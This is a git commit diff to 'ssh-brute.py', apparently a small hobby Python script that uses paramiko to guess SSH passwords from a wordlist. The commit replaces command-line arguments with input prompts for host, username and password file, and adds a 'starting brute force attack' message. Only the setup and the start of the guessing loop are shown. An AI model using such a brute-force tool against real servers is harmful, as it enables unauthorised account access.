c07fc89446df6fa02a0fdf1181052b8b6fad8368
Travis Bowen <Travisbowen23@gmail.com>
2022-08-10 18:19:23 -0600

    Added user prompts to script

--- ssh-brute.py
+++ ssh-brute.py
@@ -2,16 +2,13 @@ from pwn import *
 import paramiko
 import sys
 
-#argv[1] = host (ex.127.0.0.1)
-host = str(sys.argv[1])
-#argv[2] = username (ex.root)
-username = str(sys.argv[2])
+host = input("Enter host: ex.127.0.0.1\n ")
+username = input("Enter username: ex.root\n ")
 attempts = 0
 
-
 #Open file with read permissions 
-# argv[3] = file (ex. /etc/passwd)
-with open(str(sys.argv[3]), "r") as password_list:
+with open(input("Enter file path ex./etc/passwd.txt\n "), "r") as password_list:
+  print("[+] Starting brute force attack on " + host + " with username " + username)
   for password in password_list:
     password = password.strip("\n") #Stripping password
     try: 
